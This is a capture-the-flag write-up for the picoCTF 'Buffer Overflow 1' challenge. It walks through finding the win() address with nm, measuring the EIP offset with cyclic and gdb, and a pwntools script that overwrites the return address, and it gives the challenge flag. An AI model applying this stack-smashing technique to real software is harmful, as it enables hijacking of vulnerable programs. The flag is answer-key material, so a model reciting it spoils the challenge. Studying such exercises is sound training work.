# Buffer Overflow 1

## Write-Up

### Introduction

Whe analysing the code, you can find the following functions use : 

 - `fflush(stdout)` : flush a stream. For output streams, fflush() forces a write of all user-space buffered data for the given output or update stream via the stream's underlying write function.

This functions helps when data is in the buffers program to flush it to output streams like terminal. This is useful when using `netcat` and will block until an interaction happens from the user, it will directly flush out buffers data without that interaction or making user wait indifinatly.

 - `gets()` : get a string from standard input (DEPRECATED).

We can find in the BUGS section that it is deprecated and not used, since it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.

 - `vuln()` : a vulnerable function that, using `gets()` function reads a string from the input and put it in a buffer

 - `win()` : function that prints out the flag

In order to get the flag, you can cause a buffer overflow by entering a big amount of characters to overwrite pointers program. But this time, we need to be precise on the address to overwrite and with what overwrtiting with, since there is no handler for segmentation fault.

### Tools used

 - `gdb`
 - `gef` : pritifying of `gdb`, see : https://github.com/hugsy/gef 
 - `nm` : extract addresses of functions inside a binary
 - `cyclic` : gives a bytes cycle sequence to overwrite pointers and variables with.
 - `pwn tools` : binary exploitation tools library of python

### Explanation of the attack :

When seeing the code, we can that the vuln functions reads a buffer, and then normally get back to the main function to continue the executiion. Our goal here is to try to overwrite pointers and variables but to make the program jump to the `win()` function so we can print out the flag, and that by causing a **segmentation fault**.

To do that we can try to access a part of the memory that we dont have the right to like pointers of the stack ..., and we can use gets and its vulnerability to do that.

First, we need to get the following informations :

 - **Adresse of the win() function in the binary** : which is static in this case, we can do that using the `nm` command : 

```
nm vuln
```

Here is the result

```
0804c03c B __bss_start
0804c03c b completed.7623
0804c034 D __data_start
0804c034 W data_start
08049140 t deregister_tm_clones
08049120 T _dl_relocate_static_pie
080491c0 t __do_global_dtors_aux
0804bf0c d __do_global_dtors_aux_fini_array_entry
0804c038 D __dso_handle
0804bf10 d _DYNAMIC
0804c03c D _edata
0804c040 B _end
         U exit@@GLIBC_2.0
         U fgets@@GLIBC_2.0
080493cc T _fini
         U fopen@@GLIBC_2.1
0804a000 R _fp_hw
080491f0 t frame_dummy
0804bf08 d __frame_dummy_init_array_entry
0804a264 r __FRAME_END__
         U getegid@@GLIBC_2.0
0804933e T get_return_address
         U gets@@GLIBC_2.0
0804c000 d _GLOBAL_OFFSET_TABLE_
         w __gmon_start__
0804a0bc r __GNU_EH_FRAME_HDR
08049000 T _init
0804bf0c d __init_array_end
0804bf08 d __init_array_start
0804a004 R _IO_stdin_used
080493c0 T __libc_csu_fini
08049350 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
080492c4 T main
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
08049180 t register_tm_clones
         U setresgid@@GLIBC_2.0
         U setvbuf@@GLIBC_2.0
080490e0 T _start
         U stdout@@GLIBC_2.0
0804c03c D __TMC_END__
08049281 T vuln
080491f6 T win
080493c5 T __x86.get_pc_thunk.bp
08049130 T __x86.get_pc_thunk.bx
```

More precisely : 

```
...
08049281 T vuln
080491f6 T win
080493c5 T __x86.get_pc_thunk.bp
...
```
This address will help us specify to the `eip` pointer where to jumb back (contexte restetution) after finishing with the `vuln` function.

**Note :** EIP is a register in x86 architectures (32bit). It holds the "Extended Instruction Pointer" for the stack. In other words, it tells the computer where to go next to execute the next command and controls the flow of a program.

 - **Number of characters needed to overwrite pointers:** Next thing to do is to get the number of characters needed to overwrite the `eip` pointer, to do that we will use `gdb` and `cyclyc` tools :

Fist, generate and random length string using `cyclic 50`. Note that the given lengh is bigger then the read buffer size

```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
```

After that, we run the `vuln` binary in `gdb` and give it our generated string. Notice in the `eip` pointer the string part specified as nesxt instruction address : 

```
Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x41      
$ebx   : 0x6161616a ("jaaa"?)
$ecx   : 0x0       
$edx   : 0xf7fc0500  →  0xf7fc0500  →  [loop detected]
$esp   : 0xffffcf20  →  0xff00616d ("ma"?)
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0xffffd004  →  0xffffd1c9  →  "/home/rivench/Documents/picoCTF/buffer_overflow_1/[...]"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x6161616c ("laaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf20│+0x0000: 0xff00616d ("ma"?)   ← $esp
0xffffcf24│+0x0004: 0xf7fbf66c  →  0xf7ffdba0  →  0xf7fbf780  →  0xf7ffda40  →  0x00000000
0xffffcf28│+0x0008: 0xf7fbfb10  →  0xf7c1ac8a  →  "GLIBC_PRIVATE"
0xffffcf2c│+0x000c: 0x000003e8
0xffffcf30│+0x0010: 0xffffcf50  →  0x00000001
0xffffcf34│+0x0014: 0xf7e20ff4  →  0x00220d8c
0xffffcf38│+0x0018: 0xf7ffd020  →  0xf7ffda40  →  0x00000000
0xffffcf3c│+0x001c: 0xf7c213b5  →   add esp, 0x10
──────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
──────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x6161616c in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```
we can see that it took "laaa" as the address where to go to for contexte restitution. To get the characters needed to overwrite the `eip` pointer then we needed to give `cyclic` command the sustring that the pointer was overwritend with :

```
cyclic -l laaa
```

Here is the result

```
44
```

So we need to generate 44 characters to arrive to the `eip` pointer, then give it the address we want so it jumbs to it after finishing with the vuln function.

```
cyclic 44
```

```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa
```

Note that in `gdb`, if you give it 44 characters only you will find segmenation fault for other points, but the `eip` still not touched and points to the `main()` function :

```
0x08049300 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x40      
$ebx   : 0x6161616a ("jaaa"?)
$ecx   : 0x0       
$edx   : 0xf7fc0500  →  0xf7fc0500  →  [loop detected]
$esp   : 0xffffcf20  →  0xffffcf60  →  0xf7e20ff4  →  0x00220d8c
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0xffffd004  →  0xffffd1c9  →  "/home/rivench/Documents/picoCTF/buffer_overflow_1/[...]"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x8049300  →  <main+60> dec DWORD PTR [ecx-0x137c0bbb]
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf20│+0x0000: 0xffffcf60  →  0xf7e20ff4  →  0x00220d8c     ← $esp
0xffffcf24│+0x0004: 0xf7fbf66c  →  0xf7ffdba0  →  0xf7fbf780  →  0xf7ffda40  →  0x00000000
0xffffcf28│+0x0008: 0xf7fbfb10  →  0xf7c1ac8a  →  "GLIBC_PRIVATE"
0xffffcf2c│+0x000c: 0x000003e8
0xffffcf30│+0x0010: 0xffffcf50  →  0x00000001
0xffffcf34│+0x0014: 0xf7e20ff4  →  0x00220d8c
0xffffcf38│+0x0018: 0xf7ffd020  →  0xf7ffda40  →  0x00000000
0xffffcf3c│+0x001c: 0xf7c213b5  →   add esp, 0x10
──────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
 →  0x8049300 <main+60>        dec    DWORD PTR [ecx-0x137c0bbb]
    0x8049306 <main+66>        add    al, 0xff
    0x8049308 <main+68>        jne    0x80492fe <main+58>
    0x804930a <main+70>        push   DWORD PTR [ebp-0xc]
    0x804930d <main+73>        push   DWORD PTR [ebp-0xc]
    0x8049310 <main+76>        call   0x80490d0 <setresgid@plt>
──────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x8049300 in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049300 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

Now that we have th information we needed, we can create our script that exploit the vulnerability in the source code. we will be using `pwn` tools for that : 

 - First, get the byte version of the address found of the `win()` function :

```python
# Python 3.10.8 (main, Oct 24 2022, 10:07:16) [GCC 12.2.0] on linux
# Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
```

 - After that, using connection tools, send the character sequence generated followed by the address we want to overwrite the `eip` pointer with. We can create a python script for that : 

```python
#! /usr/bin/python3

from pwn import *

p = process('./vuln')

p.sendlineafter(b'Please enter your string: \n', b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa\xf6\x91\x04\x08')
p.interactive()
```

After executing that code, first, the pointers will be overwrited of the `vuln` program but we will find that the `eip` pointer will be overwrittend with our specific address, this will make him jump to the `win()` instead of returning to the main function, and after execution prints out the flag.

**Note :** in order to run `vuln` binary, add execution permissions to it.

## Flag

flag : picoCTF{addr3ss3s_ar3_3asy_c76b273b}

## More information :

https://0xrick.github.io/binary-exploitation/bof3/?fbclid=IwAR2Mppoig0o57gQUBm1YQIGH44tBtqWeRB3Jr56RrAFlTzq96qFj5WR_vp8
https://courses.cs.washington.edu/courses/cse374/18sp/lectures/20-buffer-overflows.html?fbclid=IwAR04qbKpLA2emy0_RunFvULwi2qXYSR8-9WtdsawX-bvM5DNWi4l187gOwA